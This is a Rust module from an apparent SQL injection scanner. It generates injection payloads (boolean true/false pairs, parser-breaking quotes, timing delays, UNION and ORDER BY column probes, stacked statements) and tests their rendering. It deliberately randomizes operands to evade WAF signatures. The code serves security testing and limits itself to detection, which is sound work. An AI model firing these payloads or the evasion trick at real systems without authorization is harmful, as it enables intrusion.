//! Payload generation: dialect rendering, clause strategies, composition.
//!
//! Replaces the empty `generators::boolean_based`/`union_based` stubs. No
//! combination is stored as a literal string — a candidate is composed from
//! a logical test, a dialect renderer, a boundary, and a clause strategy.

use crate::detection::DbmsFamily;
use crate::payload::boundary::{Boundary, QuoteMode};
use crate::types::ProbeType;
use serde::{Deserialize, Serialize};

/// The logical SQL construct a test expresses, independent of dialect.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum LogicalTest {
    /// A tautology: `1=1`.
    AlwaysTrue,
    /// A contradiction: `1=2`.
    AlwaysFalse,
    /// A syntactically invalid fragment used to elicit a parser error.
    SyntaxBreak,
    /// A conditional delay.
    TimeDelay { seconds: u32 },
    /// A set-based probe with `n` columns.
    UnionProbe { columns: usize },
    /// An `ORDER BY n` probe: the cheap half of UNION column-count
    /// enumeration. The column count is the largest `n` the query accepts
    /// before it errors, so a sweep over `n` locates the width without a
    /// single UNION.
    ColumnCountProbe { columns: usize },
    /// A stacked statement marker.
    StackedMarker,
    /// Inline conditional expression.
    InlineConditional { condition: String },
}

/// A signature-evading integer operand derived from a fresh UUID.
///
/// Boolean differentials historically rendered as the literal `1=1`/`1=2`,
/// which naive signature WAFs block on sight and which every scanner emits.
/// Deriving the operands from a per-call UUID keeps each payload
/// arithmetically valid while making it textually unique — no `rand`
/// dependency required.
pub fn evasive_operand() -> u32 {
    let bytes = uuid::Uuid::new_v4().into_bytes();
    // A 4-digit operand in [1000, 9999]; never the trivial `1`.
    1000 + (u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]) % 9000)
}

/// A matched equality/inequality for a boolean differential.
///
/// TRUE renders as `N=N` (always true), FALSE as `N=M` with `M != N` (always
/// false). The two arms stay logically matched so boolean-blind differential
/// detection keeps working, but neither is the trivial `1=1`/`1=2`.
pub fn evasive_equality(truth: bool) -> String {
    let n = evasive_operand();
    if truth {
        format!("{n}={n}")
    } else {
        format!("{n}={}", n.wrapping_add(1))
    }
}

/// Renders a logical test into dialect-specific SQL.
pub fn render_sql(test: &LogicalTest, dbms: Option<DbmsFamily>) -> String {
    match test {
        LogicalTest::AlwaysTrue => format!("AND {}", evasive_equality(true)),
        LogicalTest::AlwaysFalse => format!("AND {}", evasive_equality(false)),
        LogicalTest::SyntaxBreak => "'\"".to_string(),
        LogicalTest::TimeDelay { seconds } => match dbms {
            // A known engine renders from its profile: the catalogue holds the
            // primitive that engine actually has. This replaced a set of
            // hand-written arms, one of which emitted `WAITFOR DELAY(5)` —
            // not valid T-SQL, because WAITFOR is a statement, not a function.
            Some(family) => {
                let ctx = crate::payload::vectors::VectorContext {
                    query: "SELECT 1".to_string(),
                    seconds: *seconds,
                    columns: 1,
                    host: String::new(),
                    truth: true,
                };
                crate::payload::vectors::vectors_for(
                    family,
                    crate::payload::vectors::VectorChannel::Timing,
                    &ctx,
                )
                .first()
                .map(|v| v.sql.clone())
                .unwrap_or_else(|| {
                    format!(
                        "AND {} /* no timing primitive is known for {} */",
                        evasive_equality(true),
                        family.label()
                    )
                })
            }
            // Unknown DBMS: emit the most portable conditional form and let
            // evidence decide. This is a hypothesis, not a claim.
            None => format!("AND {} /* delay {seconds}s if supported */", evasive_equality(true)),
        },
        LogicalTest::UnionProbe { columns } => {
            let cols = vec!["NULL"; *columns].join(",");
            format!("UNION SELECT {cols}")
        }
        LogicalTest::ColumnCountProbe { columns } => format!("ORDER BY {columns}"),
        LogicalTest::StackedMarker => ";SELECT 1".to_string(),
        LogicalTest::InlineConditional { condition } => {
            format!("AND (SELECT CASE WHEN ({condition}) THEN 1 ELSE 1 END)")
        }
    }
}

/// A fully composed, executable test candidate.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadCandidate {
    /// Stable ID for evidence correlation.
    pub id: uuid::Uuid,
    pub technique: ProbeType,
    /// The logical construct, for the UI trace.
    pub logical_test: String,
    /// The final string to place at the injection point.
    pub rendered: String,
    pub boundary: Boundary,
    pub dialect: Option<String>,
    pub expected_dbms: Option<DbmsFamily>,
    /// Why this candidate was generated (shown in the UI).
    pub rationale: String,
}

/// Inputs the generator reasons over.
#[derive(Debug, Clone)]
pub struct GenerationContext {
    pub quote_mode: QuoteMode,
    pub dbms_hypothesis: Option<DbmsFamily>,
    /// Clauses the parameter appears to occupy.
    pub clause_hint: Option<String>,
    /// Original parameter value, for context-sensitive rendering.
    pub original_value: String,
}

/// Generate boolean-differential candidates: a matched true/false pair.
///
/// A single "true" payload proves nothing — the pair is the experiment.
pub fn generate_boolean(ctx: &GenerationContext) -> Vec<PayloadCandidate> {
    let mut out = Vec::new();
    for boundary in crate::payload::boundary::candidates_for(ctx.quote_mode) {
        for (test, label) in [
            (LogicalTest::AlwaysTrue, "true condition"),
            (LogicalTest::AlwaysFalse, "false condition"),
        ] {
            let sql = render_sql(&test, ctx.dbms_hypothesis);
            out.push(PayloadCandidate {
                id: uuid::Uuid::new_v4(),
                technique: ProbeType::BooleanBlind,
                logical_test: format!("{:?}", test),
                rendered: boundary.render(&sql),
                boundary: boundary.clone(),
                dialect: ctx.dbms_hypothesis.map(|d| format!("{d:?}")),
                expected_dbms: ctx.dbms_hypothesis,
                rationale: format!(
                    "{label} for boolean differential in a {} context",
                    match ctx.quote_mode {
                        QuoteMode::None => "numeric",
                        QuoteMode::Single => "single-quoted",
                        _ => "quoted",
                    }
                ),
            });
        }
    }
    out
}

/// Generate error-based candidates that elicit parser errors.
pub fn generate_error(ctx: &GenerationContext) -> Vec<PayloadCandidate> {
    let mut out = Vec::new();
    for boundary in crate::payload::boundary::candidates_for(ctx.quote_mode) {
        let sql = render_sql(&LogicalTest::SyntaxBreak, ctx.dbms_hypothesis);
        out.push(PayloadCandidate {
            id: uuid::Uuid::new_v4(),
            technique: ProbeType::ErrorInjection,
            logical_test: "SyntaxBreak".to_string(),
            rendered: boundary.render(&sql),
            boundary: boundary.clone(),
            dialect: ctx.dbms_hypothesis.map(|d| format!("{d:?}")),
            expected_dbms: ctx.dbms_hypothesis,
            rationale: "elicit a database parser error to fingerprint the DBMS".to_string(),
        });
    }
    out
}

/// Generate timing candidates.
pub fn generate_timing(ctx: &GenerationContext, seconds: u32) -> Vec<PayloadCandidate> {
    let mut out = Vec::new();
    for boundary in crate::payload::boundary::candidates_for(ctx.quote_mode) {
        let sql = render_sql(&LogicalTest::TimeDelay { seconds }, ctx.dbms_hypothesis);
        out.push(PayloadCandidate {
            id: uuid::Uuid::new_v4(),
            technique: ProbeType::TimingProbe,
            logical_test: format!("TimeDelay{{seconds:{seconds}}}"),
            rendered: boundary.render(&sql),
            boundary: boundary.clone(),
            dialect: ctx.dbms_hypothesis.map(|d| format!("{d:?}")),
            expected_dbms: ctx.dbms_hypothesis,
            rationale: format!(
                "conditional {seconds}s delay; only a statistically separated distribution counts"
            ),
        });
    }
    out
}

/// Generate UNION probes across a column-count range.
///
/// The range is bounded — this is context exploration, not extraction.
pub fn generate_union(ctx: &GenerationContext, max_columns: usize) -> Vec<PayloadCandidate> {
    let mut out = Vec::new();
    let max_columns = max_columns.clamp(1, 10);
    for boundary in crate::payload::boundary::candidates_for(ctx.quote_mode) {
        for columns in 1..=max_columns {
            let sql = render_sql(&LogicalTest::UnionProbe { columns }, ctx.dbms_hypothesis);
            out.push(PayloadCandidate {
                id: uuid::Uuid::new_v4(),
                technique: ProbeType::UnionBased,
                logical_test: format!("UnionProbe{{columns:{columns}}}"),
                rendered: boundary.render(&sql),
                boundary: boundary.clone(),
                dialect: ctx.dbms_hypothesis.map(|d| format!("{d:?}")),
                expected_dbms: ctx.dbms_hypothesis,
                rationale: format!("probe whether a {columns}-column UNION is accepted"),
            });
        }
    }
    out
}

/// Generate stacked-query candidates (detection only — benign statements).
pub fn generate_stacked(ctx: &GenerationContext) -> Vec<PayloadCandidate> {
    let mut out = Vec::new();
    for boundary in crate::payload::boundary::candidates_for(ctx.quote_mode) {
        let sql = render_sql(&LogicalTest::StackedMarker, ctx.dbms_hypothesis);
        out.push(PayloadCandidate {
            id: uuid::Uuid::new_v4(),
            technique: ProbeType::ClauseVariant,
            logical_test: "StackedMarker".to_string(),
            rendered: boundary.render(&sql),
            boundary: boundary.clone(),
            dialect: ctx.dbms_hypothesis.map(|d| format!("{d:?}")),
            expected_dbms: ctx.dbms_hypothesis,
            rationale: "detect whether multiple statements are permitted (benign SELECT only)"
                .to_string(),
        });
    }
    out
}

/// Generate the candidate set for one technique.
pub fn generate_for(technique: ProbeType, ctx: &GenerationContext) -> Vec<PayloadCandidate> {
    match technique {
        ProbeType::BooleanBlind => generate_boolean(ctx),
        ProbeType::ErrorInjection => generate_error(ctx),
        ProbeType::TimingProbe => generate_timing(ctx, 5),
        ProbeType::UnionBased => generate_union(ctx, 5),
        ProbeType::SyntaxFeature | ProbeType::ClauseVariant => {
            let mut out = generate_error(ctx);
            out.extend(generate_stacked(ctx));
            out
        }
        ProbeType::Baseline => Vec::new(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn numeric_ctx() -> GenerationContext {
        GenerationContext {
            quote_mode: QuoteMode::None,
            dbms_hypothesis: Some(DbmsFamily::PostgreSQL),
            clause_hint: Some("WHERE".into()),
            original_value: "1".into(),
        }
    }

    #[test]
    fn boolean_generation_produces_a_true_false_pair() {
        let candidates = generate_boolean(&numeric_ctx());
        assert!(candidates.len() >= 2);
        // Expert differentials, never the trivial `1=1`/`1=2` signatures.
        assert!(
            candidates.iter().all(|c| !is_trivial_tautology(&c.rendered)),
            "a trivial tautology leaked into a candidate: {:?}",
            candidates.iter().map(|c| c.rendered.clone()).collect::<Vec<_>>()
        );
        // A matched pair: one equal-operand (true) and one unequal (false).
        assert!(
            candidates
                .iter()
                .any(|c| first_int_comparison(&c.rendered).map(|(l, r)| l == r) == Some(true)),
            "no true (equal-operand) differential"
        );
        assert!(
            candidates
                .iter()
                .any(|c| first_int_comparison(&c.rendered).map(|(l, r)| l != r) == Some(true)),
            "no false (unequal-operand) differential"
        );
    }

    /// The first `<digits>=<digits>` comparison in `sql`, as `(left, right)`.
    /// `None` when the arm uses a non-arithmetic form.
    fn first_int_comparison(sql: &str) -> Option<(&str, &str)> {
        let bytes = sql.as_bytes();
        for (i, _) in sql.match_indices('=') {
            let mut ls = i;
            while ls > 0 && bytes[ls - 1].is_ascii_digit() {
                ls -= 1;
            }
            let mut re = i + 1;
            while re < bytes.len() && bytes[re].is_ascii_digit() {
                re += 1;
            }
            if ls < i && re > i + 1 {
                return Some((&sql[ls..i], &sql[i + 1..re]));
            }
        }
        None
    }

    /// Whether the comparison is the trivial single-digit `1=1`/`1=2` that a
    /// signature filter keys on (randomized 4-digit operands are not).
    fn is_trivial_tautology(sql: &str) -> bool {
        matches!(first_int_comparison(sql), Some(("1", "1")) | Some(("1", "2")))
    }

    #[test]
    fn every_candidate_carries_a_rationale() {
        for technique in [
            ProbeType::BooleanBlind,
            ProbeType::ErrorInjection,
            ProbeType::TimingProbe,
            ProbeType::UnionBased,
        ] {
            for c in generate_for(technique, &numeric_ctx()) {
                assert!(!c.rationale.is_empty(), "{technique:?} candidate had no rationale");
            }
        }
    }

    #[test]
    fn postgres_timing_uses_pg_sleep() {
        let sql = render_sql(&LogicalTest::TimeDelay { seconds: 5 }, Some(DbmsFamily::PostgreSQL));
        assert!(sql.contains("PG_SLEEP") || sql.to_lowercase().contains("pg_sleep"));
    }

    #[test]
    fn mysql_timing_uses_sleep() {
        let sql = render_sql(&LogicalTest::TimeDelay { seconds: 5 }, Some(DbmsFamily::MySQL));
        assert!(sql.contains("SLEEP(5)"));
    }

    #[test]
    fn unknown_dbms_does_not_claim_a_delay_function() {
        let sql = render_sql(&LogicalTest::TimeDelay { seconds: 5 }, None);
        assert!(!sql.to_uppercase().contains("SLEEP(5)"));
        assert!(sql.contains("/*"), "unknown DBMS should annotate the probe");
    }

    #[test]
    fn union_probe_renders_null_padding() {
        let sql = render_sql(&LogicalTest::UnionProbe { columns: 3 }, None);
        assert_eq!(sql, "UNION SELECT NULL,NULL,NULL");
    }

    #[test]
    fn column_count_probe_renders_order_by() {
        // The cheap half of UNION enumeration: `ORDER BY n` locates the width
        // by the index at which the query starts to error.
        let sql = render_sql(&LogicalTest::ColumnCountProbe { columns: 7 }, None);
        assert_eq!(sql, "ORDER BY 7");
    }

    #[test]
    fn union_columns_are_bounded() {
        let candidates = generate_union(&numeric_ctx(), 100);
        // clamp to 10 columns max
        assert!(candidates.iter().all(|c| {
            c.logical_test
                .trim_start_matches("UnionProbe{columns:")
                .trim_end_matches('}')
                .parse::<usize>()
                .map(|n| n <= 10)
                .unwrap_or(true)
        }));
    }

    #[test]
    fn single_quote_context_opens_a_quote() {
        let ctx = GenerationContext {
            quote_mode: QuoteMode::Single,
            dbms_hypothesis: None,
            clause_hint: None,
            original_value: "abc".into(),
        };
        for c in generate_boolean(&ctx) {
            assert!(c.rendered.starts_with('\''), "expected opening quote: {}", c.rendered);
        }
    }

    #[test]
    fn candidate_ids_are_unique() {
        let candidates = generate_boolean(&numeric_ctx());
        let ids: std::collections::HashSet<_> = candidates.iter().map(|c| c.id).collect();
        assert_eq!(ids.len(), candidates.len());
    }

    #[test]
    fn baseline_generates_nothing() {
        assert!(generate_for(ProbeType::Baseline, &numeric_ctx()).is_empty());
    }
}
